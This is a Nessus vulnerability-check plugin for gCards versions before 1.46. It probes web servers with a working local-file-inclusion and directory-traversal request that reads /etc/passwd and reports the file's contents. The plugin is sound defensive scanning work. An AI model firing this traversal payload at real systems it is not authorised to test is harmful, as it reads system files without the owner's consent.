#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#


include("compat.inc");

if (description) {
script_id(21168);
script_version("$Revision: 1.15 $");

script_cve_id("CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348");
script_bugtraq_id(17165);
  script_osvdb_id(24016, 24017, 24018);

script_name(english:"gCards < 1.46 Multiple Vulnerabilities");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running gCards, a free electronic greeting card
system written in PHP. 

The installed version of gCards fails to sanitize user input to the
'setLang' parameter in the 'inc/setLang.php' script which is called by
'index.php'.  An unauthenticated attacker may be able to exploit this
issue to read arbitrary local files or execute code from local files
subject to the permissions of the web server user id. 

There are also reportedly other flaws in the installed application,
including a directory traversal issue that allows reading of local
files as well as a SQL injection and a cross-site scripting issue." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/gcards_145_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5e89025e" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to gCards version 1.46 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/20");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


summary["english"] = "Checks for directory transversal in gCards index.php script";
script_summary(english:summary["english"]);

script_category(ACT_ATTACK);
script_family(english:"CGI abuses");

script_copyright(english:"This script is Copyright (C) 2006-2015 Josh Zlatin-Amishav");

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");
	script_require_keys("www/PHP");
exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


if (thorough_tests) dirs = list_uniq(make_list("/gcards", cgi_dirs()));
else dirs = make_list(cgi_dirs());

# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in setLang.php to read /etc/passwd.
  lang = SCRIPT_NAME;
  req = http_get(
    item:string(
    dir, "/index.php?",
    "setLang=", lang, "&",
    "lang[", lang, "][file]=../../../../../../../../../../../../etc/passwd"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    egrep(pattern:">gCards</a> v.*Graphics by Greg gCards", string:res) &&
    (
      # there's an entry for root or ...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(inc/lang/.+/etc/passwd\).+ failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction
      egrep(pattern:"main.+ open_basedir restriction in effect\. File\(\./inc/lang/.+/etc/passwd", string:res)
    )
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      content = res - strstr(res, '<!DOCTYPE HTML PUBLIC');

    if (content)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
      security_hole(port:port, extra:report);
    }
    else
    security_hole(port:port);

    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
